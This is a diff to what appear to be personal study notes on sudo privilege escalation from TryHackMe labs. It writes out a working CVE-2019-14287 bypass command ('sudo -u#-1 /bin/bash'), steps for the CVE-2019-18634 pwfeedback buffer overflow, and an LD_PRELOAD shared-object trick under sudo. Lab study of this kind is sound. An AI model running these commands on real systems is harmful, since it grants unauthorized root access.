@@ -68,7 +68,46 @@ sudo LD_PRELOAD=/path/to/shell.so apache2
 ```
 
 # Sudo PrivEsc Challenge
+Challenge :
+1. SimpleCTF - https://tryhackme.com/room/easyctf (exploited...)
+Resources :
+2. dirsearch - [https://github.com/maurosoria/dirsearch](https://github.com/maurosoria/dirsearch)
+3. Exploit-DB for Simple CMS - [https://www.exploit-db.com/exploits/46635](https://www.exploit-db.com/exploits/46635)
+
+# Sudo - CVE-2019-14287
 
 Resources :
-1. dirsearch - [https://github.com/maurosoria/dirsearch](https://github.com/maurosoria/dirsearch)
-2. Exploit-DB for Simple CMS - [https://www.exploit-db.com/exploits/46635](https://www.exploit-db.com/exploits/46635)
+1. Exploit-DB for CVE-2019-14287
+## Sudo Security Bypass (THM-hands-on)
+
+**Room Link :** https://tryhackme.com/room/sudovulnsbypass
+
+Command ran :
+```bash
+sudo -u#-1 /bin/bash
+
+# Drops a root bash-shell
+```
+# Sudo - CVE-2019-18634
+
+Resources :
+1. Exploit-DB for CVE-2019-18634 : https://github.com/saleemrashid/sudo-cve-2019-18634
+## Sudo Buffer Overflow (THM-hands-on)
+
+**Room Link :** https://tryhackme.com/room/sudovulnsbof
+
+Commands Ran :
+```bash
+sudo -V
+# to get version of sudo
+# Sudo versions 1.7.1 to 1.8.30 inclusive are affected but only if the pwfeedback option is enabled in sudoers file
+# pwfeedback is the *'s you see when typing a password
+# password: **********
+
+./exploit
+# ran exploit present in the room
+# Drops a root sh-shell. Can run...
+bash
+# Drops a root bash-shell
+```
+
